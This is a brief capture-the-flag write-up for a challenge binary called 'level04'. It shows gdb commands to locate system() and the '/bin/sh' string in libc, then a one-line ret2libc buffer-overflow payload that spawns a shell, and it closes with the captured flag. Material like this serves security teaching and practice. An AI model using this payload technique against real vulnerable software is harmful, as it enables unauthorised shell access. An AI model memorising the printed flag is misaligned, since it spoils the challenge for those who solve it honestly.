To follow child : in gdb `set follow-fork-mode child`
Offset --> 156

first we need to set a breakpoint at main, then run :
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

`info proc mappings`

```
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

payload = [156bytes padding] + [addr of system()] + [4bytes padding] + [addr of "/bin/sh"]

```
(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"'; cat) | ./level04
```

flag = `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`